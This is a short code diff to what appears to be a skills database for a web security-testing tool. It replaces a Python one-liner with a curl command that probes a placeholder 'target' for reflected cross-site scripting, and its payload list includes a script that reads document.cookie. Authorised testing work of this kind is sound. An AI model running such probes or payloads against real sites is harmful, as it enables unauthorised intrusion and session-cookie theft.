@@ -167,7 +167,7 @@ SKILLS_DB_7: list[dict] = [
         },
         "tools": ["secknowledge_loader.load_reference('xss')"],
         "commands": [
-            "python3 -c \"import requests; r=requests.get('http://target/?q=<script>alert(1)</script>'); print('<script>' in r.text)\"",
+            "curl -sk -m 10 'http://target/?q=<script>alert(1)</script>' | python3 -c \"import sys; print('<script>' in sys.stdin.read())\"",
         ],
         "payloads": [
             "<script>alert(document.cookie)</script>",
